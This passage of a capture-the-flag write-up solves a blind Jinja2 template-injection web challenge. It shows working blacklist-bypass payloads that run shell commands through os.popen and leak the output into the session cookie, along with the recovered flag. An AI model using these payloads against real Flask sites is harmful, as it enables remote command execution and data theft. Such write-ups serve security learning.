</span><span class="code-line"> <span class="token string">&#x27;class&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;mro&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;init&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;builtins&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;request&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;app&#x27;</span><span class="token punctuation">,</span><span class="token string">&#x27;sleep&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;add&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;+&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;config&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;subclasses&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;format&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;dict&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;get&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;attr&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;globals&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;time&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;read&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;import&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;sys&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;cookies&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;headers&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;doc&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;url&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;encode&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;decode&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;chr&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;ord&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;replace&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;echo&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;base&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;self&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;template&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;print&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;exec&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;response&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;join&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;cat&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;%s&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;{}&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;\\&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;*&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;&amp;&#x27;</span><span class="token punctuation">,</span><span class="token string">&quot;{{&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;}}&quot;</span><span class="token punctuation">,</span> <span class="token string">&#x27;[]&#x27;</span><span class="token punctuation">,</span><span class="token string">&quot;&#x27;&#x27;&quot;</span><span class="token punctuation">,</span><span class="token string">&#x27;&quot;&quot;&#x27;</span><span class="token punctuation">,</span><span class="token string">&#x27;|&#x27;</span><span class="token punctuation">,</span><span class="token string">&#x27;=&#x27;</span><span class="token punctuation">,</span><span class="token string">&#x27;~&#x27;</span><span class="token punctuation">]</span>
</span><span class="code-line">
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">def</span> <span class="token function">check_filter</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    <span class="token builtin">input</span> <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token keyword">if</span> <span class="token builtin">input</span><span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">&#x27;.&#x27;</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">1</span> <span class="token keyword">or</span> <span class="token builtin">input</span><span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">&#x27;:&#x27;</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">1</span> <span class="token keyword">or</span> <span class="token builtin">input</span><span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">&#x27;/&#x27;</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">:</span>
</span><span class="code-line">        <span class="token keyword">return</span> <span class="token boolean">False</span>
</span><span class="code-line">    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">115</span><span class="token punctuation">:</span>
</span><span class="code-line">        <span class="token keyword">for</span> char <span class="token keyword">in</span> <span class="token builtin">input</span><span class="token punctuation">:</span>
</span><span class="code-line">            <span class="token keyword">if</span> char <span class="token keyword">in</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">:</span>
</span><span class="code-line">                <span class="token keyword">return</span> <span class="token boolean">False</span>
</span><span class="code-line">        <span class="token keyword">for</span> i <span class="token keyword">in</span> UNALLOWED<span class="token punctuation">:</span>
</span><span class="code-line">            <span class="token keyword">if</span> i <span class="token keyword">in</span> <span class="token builtin">input</span><span class="token punctuation">:</span>
</span><span class="code-line">                <span class="token keyword">return</span> <span class="token boolean">False</span>
</span><span class="code-line">        <span class="token keyword">return</span> <span class="token boolean">True</span>
</span><span class="code-line">    <span class="token keyword">return</span> <span class="token boolean">False</span>
</span></code></pre></div>
<p>Now let’s find out what’s going on here.</p>
<p>The first thing to notice is the first if statement, we’ll need only one of these to be true to get past it due to the usage of the OR operator.</p>
<p>Which I wish I have noticed earlier, as I was trying to forge <code>/</code> with <code>${PWD%${PWD#?}}</code> and ended up giving up on it because it was ending with <code>}}</code> and limited length.</p>
<div class="relative"><pre><code class="language-sh code-highlight"><span class="code-line">$ cat &quot;${PWD%${PWD#?}}&quot;flag
</span><span class="code-line">crew{fakeflag}$
</span></code></pre></div>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line"><span class="token keyword">if</span> <span class="token builtin">input</span><span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">&#x27;.&#x27;</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">1</span> <span class="token keyword">or</span> <span class="token builtin">input</span><span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">&#x27;:&#x27;</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">1</span> <span class="token keyword">or</span> <span class="token builtin">input</span><span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">&#x27;/&#x27;</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">1</span> <span class="token punctuation">:</span>
</span></code></pre></div>
<p>Also, a thing to keep in mind the length limit. so we need to have a limited payload size.</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line"><span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">115</span>
</span></code></pre></div>
<p>Moreover, We can’t use digits so we can’t bypass the blacklist with Unicode.</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line"><span class="token keyword">if</span> char <span class="token keyword">in</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">:</span>
</span><span class="code-line">	<span class="token keyword">return</span> <span class="token boolean">False</span>
</span></code></pre></div>
<p>Finally, the blacklist.</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line">UNALLOWED <span class="token operator">=</span> <span class="token punctuation">[</span>
</span><span class="code-line"> <span class="token string">&#x27;class&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;mro&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;init&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;builtins&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;request&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;app&#x27;</span><span class="token punctuation">,</span><span class="token string">&#x27;sleep&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;add&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;+&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;config&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;subclasses&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;format&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;dict&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;get&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;attr&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;globals&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;time&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;read&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;import&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;sys&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;cookies&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;headers&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;doc&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;url&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;encode&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;decode&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;chr&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;ord&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;replace&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;echo&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;base&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;self&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;template&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;print&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;exec&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;response&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;join&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;cat&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;%s&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;{}&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;\\&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;*&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;&amp;&#x27;</span><span class="token punctuation">,</span><span class="token string">&quot;{{&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;}}&quot;</span><span class="token punctuation">,</span> <span class="token string">&#x27;[]&#x27;</span><span class="token punctuation">,</span><span class="token string">&quot;&#x27;&#x27;&quot;</span><span class="token punctuation">,</span><span class="token string">&#x27;&quot;&quot;&#x27;</span><span class="token punctuation">,</span><span class="token string">&#x27;|&#x27;</span><span class="token punctuation">,</span><span class="token string">&#x27;=&#x27;</span><span class="token punctuation">,</span><span class="token string">&#x27;~&#x27;</span><span class="token punctuation">]</span>
</span></code></pre></div>
<p>I’ve added few debugging <code>print</code>s and an input to the filter to test the payloads that I create.</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line"><span class="token builtin">input</span><span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;&gt; &quot;</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token keyword">print</span><span class="token punctuation">(</span>check_filter<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[.] &quot;</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">&#x27;.&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[/] &quot;</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">&#x27;/&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[:] &quot;</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">&#x27;:&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[Len] &quot;</span><span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>So, to summarize, we have a blind SSTI with some interesting blacklist and length limited.</p>
<p>We can make a small skeleton for our payload.</p>
<ul>
<li>
<p>It’s a blind SSTI, we don’t really choices here, it’s either making it timing based which can take some space in the payload or just simply creating a new cookie to exfiltrate data using <code>session.update</code></p>
</li>
<li>
<p><code>{{</code> and <code>}}</code> are filtered, so we’ll probably use <code>{%</code></p>
</li>
</ul>
<p>So, for now our payload will be something like that</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line"><span class="token punctuation">{</span><span class="token operator">%</span><span class="token keyword">if</span> session<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">&#x27;f&#x27;</span><span class="token punctuation">:</span>somepayload<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>endif<span class="token operator">%</span><span class="token punctuation">}</span>
</span></code></pre></div>
<p>At this point, we’re more limited in the actual length of our payload. While i was searching for a smaller payload i came a cross <a target="_blank" rel="noopener noreferrer" href="https://podalirius.net/en/publications/grehack-2021-optimizing-ssti-payloads-for-jinja2/GreHack_2021_-_Optimizing_Server_Side_Template_Injections_payloads_for_jinja2_slides.pdf">a presentation from <code>Grehack 2021</code> by @Podalirius</a>
which has some interesting payloads and they’re can be found in <a target="_blank" rel="noopener noreferrer" href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadsAllTheThings</a>.</p>
<p>I’ll be using another payload later because of the length limit issue, This is how I originally started the challenge. They’ll be in use for the next challenge.</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line">cycler<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">&#x27;id&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line">joiner<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">&#x27;id&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line">namespace<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">&#x27;id&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>I’ll continue with the first one and to make it easier to deal with blacklisted words and also the count of dots. I’ll change it to this format</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line">cycler<span class="token punctuation">[</span><span class="token string">&#x27;__init__&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#x27;__globals__&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#x27;os&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#x27;popen&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">&#x27;id&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&#x27;read&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>First, i tried to use <code>[::-1]</code> to reverse the string, then i remembered that digits were filtered. we also can&#x27;t use <code>+</code> to concatenate the strings as it was filtered</p>
<p>I tried to use format string with int() but ended up failing. - Completely overthinking it</p>
<div class="relative"><pre><code class="language-python code-highlight"><span class="code-line"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> Template<span class="token punctuation">(</span><span class="token string">&quot;My name is {{cycler[&#x27;__tini__&#x27;[::-1]][&#x27;__slabolg__&#x27;[::-1]].os.popen(&#x27;id&#x27;).read()}}&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token string">&#x27;My name is uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floopy),27(sudo),29(audio),30(dip),142(kaboxer)\n&#x27;</span>
</span></code></pre></div>
<p>So, the idea here is pretty simple and basically we need to us an empty space between the blacklisted strings.</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line">cycler<span class="token punctuation">[</span><span class="token string">&#x27;__in&#x27;</span> <span class="token string">&#x27;it__&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#x27;__glo&#x27;</span> <span class="token string">&#x27;bals__&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#x27;os&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#x27;popen&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">&#x27;id&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&#x27;rea&#x27;</span> <span class="token string">&#x27;d&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</span></code></pre></div>
<div class="relative"><pre><code class="language-python code-highlight"><span class="code-line"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> Template<span class="token punctuation">(</span><span class="token string">&quot;My name is {{cycler[r[&#x27;__in&#x27; &#x27;it__&#x27;][&#x27;__glo&#x27; &#x27;bals__&#x27;].os.popen(&#x27;id&#x27;).read()}}&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="code-line"><span class="token string">&#x27;My name is uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floopy),27(sudo),29(audio),30(dip),142(kaboxer)\n&#x27;</span>
</span></code></pre></div>
<p>At this point, we’re pretty much over.</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line"><span class="token punctuation">{</span><span class="token operator">%</span><span class="token keyword">if</span> session<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">&#x27;f&#x27;</span><span class="token punctuation">:</span>cycler<span class="token punctuation">[</span><span class="token string">&#x27;__in&#x27;</span> <span class="token string">&#x27;it__&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#x27;__glo&#x27;</span> <span class="token string">&#x27;bals__&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#x27;os&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#x27;popen&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">&#x27;tail /flag&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&#x27;re&#x27;</span> <span class="token string">&#x27;ad&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>endif<span class="token operator">%</span><span class="token punctuation">}</span>
</span></code></pre></div>
<div class="relative"><pre><code class="language-shell code-highlight"><span class="code-line">$ python3 check_filterz.py
</span><span class="code-line">input: <span class="token punctuation">{</span>%if session.update<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">&#x27;f&#x27;</span>:cycler<span class="token punctuation">[</span><span class="token string">&#x27;__in&#x27;</span> <span class="token string">&#x27;it__&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#x27;__glo&#x27;</span> <span class="token string">&#x27;bals__&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#x27;os&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#x27;popen&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">&#x27;tail /flag&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&#x27;re&#x27;</span> <span class="token string">&#x27;ad&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">{</span>%endif%<span class="token punctuation">}</span>
</span><span class="code-line"><span class="token punctuation">[</span>.<span class="token punctuation">]</span> <span class="token number">1</span>
</span><span class="code-line"><span class="token punctuation">[</span>:<span class="token punctuation">]</span> <span class="token number">1</span>
</span><span class="code-line"><span class="token punctuation">[</span>/<span class="token punctuation">]</span> <span class="token number">1</span>
</span><span class="code-line"><span class="token punctuation">[</span>%<span class="token punctuation">]</span> <span class="token number">3</span>
</span><span class="code-line"><span class="token punctuation">[</span>len<span class="token punctuation">]</span> <span class="token number">116</span>
</span></code></pre></div>
<p>The only problem here, is that we’re exceeding the length limit. This is where I got stuck, I kept searching and fuzzing for smaller payloads and ended up using <code>lipsum</code>.</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line">lipsum<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__os__<span class="token punctuation">.</span>__popen__<span class="token punctuation">(</span><span class="token string">&#x27;id&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>I then transformed it:</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line">lipsum<span class="token punctuation">[</span><span class="token string">&#x27;__glo&#x27;</span> <span class="token string">&#x27;bals__&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#x27;os&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#x27;popen&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">&#x27;tail /flag&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&#x27;re&#x27;</span> <span class="token string">&#x27;ad&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>Our final payload is:</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line"><span class="token punctuation">{</span><span class="token operator">%</span><span class="token keyword">if</span> session<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">&#x27;f&#x27;</span><span class="token punctuation">:</span>lipsum<span class="token punctuation">[</span><span class="token string">&#x27;__glo&#x27;</span> <span class="token string">&#x27;bals__&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#x27;os&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#x27;popen&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">&#x27;tail /flag&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&#x27;re&#x27;</span> <span class="token string">&#x27;ad&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span>endif<span class="token operator">%</span><span class="token punctuation">}</span>
</span></code></pre></div>
<div class="relative"><pre><code class="language-shell code-highlight"><span class="code-line">$ python3 check_filterz.py
</span><span class="code-line">input: <span class="token punctuation">{</span>%if session.update<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">&#x27;f&#x27;</span>:lipsum<span class="token punctuation">[</span><span class="token string">&#x27;__glo&#x27;</span> <span class="token string">&#x27;bals__&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#x27;os&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#x27;popen&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">&#x27;tail /flag&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&#x27;re&#x27;</span> <span class="token string">&#x27;ad&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>%<span class="token punctuation">}</span><span class="token punctuation">{</span>%endif%<span class="token punctuation">}</span>
</span><span class="code-line">True
</span></code></pre></div>
<p>Finally, we submit it and get the cookie and decode it and get the flag \o/</p>
<div class="relative"><pre><code class="language-shell code-highlight"><span class="code-line">$ flask-unsign -d -c <span class="token string">&quot;eyJmIjoiY3Jld3s2ZjAyMWQwNWRiNTE1YTEyNGM5OTg1zmN1NTVlMGI2Yn0iLCJ1c2VyIjoiYWRtaW4ifQ.YlveoA.-EYuiEy5AxCtCGn68xioShVhVsg&quot;</span>
</span><span class="code-line"><span class="token punctuation">{</span><span class="token string">&#x27;f&#x27;</span><span class="token builtin class-name">:</span> <span class="token string">&#x27;crew{6f021d05db515a124c9985fce55c0b6b}&#x27;</span>, <span class="token string">&#x27;user&#x27;</span><span class="token builtin class-name">:</span> <span class="token string">&#x27;admin&#x27;</span><span class="token punctuation">}</span>
</span></code></pre></div>
<h1 id="ezchall-again-web"><a href="#ezchall-again-web" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>EzChall Again (Web)</h1>
<p>So this is pretty much the same challenge but with more filters, we’ll use almost the same techniques before just changing some stuff</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line"><span class="token keyword">import</span> string
</span><span class="code-line">
</span><span class="code-line">UNALLOWED <span class="token operator">=</span> <span class="token punctuation">[</span>
</span><span class="code-line"> <span class="token string">&#x27;class&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;mro&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;init&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;builtins&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;request&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;app&#x27;</span><span class="token punctuation">,</span><span class="token string">&#x27;sleep&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;add&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;+&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;config&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;subclasses&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;format&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;dict&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;get&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;attr&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;globals&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;time&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;read&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;import&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;sys&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;cookies&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;headers&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;doc&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;url&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;encode&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;decode&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;chr&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;ord&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;replace&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;echo&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;base&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;self&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;template&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;print&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;exec&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;response&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;join&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;cat&#x27;</span><span class="token punctuation">,</span><span class="token string">&#x27;if&#x27;</span><span class="token punctuation">,</span> <span class="token string">&#x27;end&#x27;</span><span class="token punctuation">,</span> <span class="token 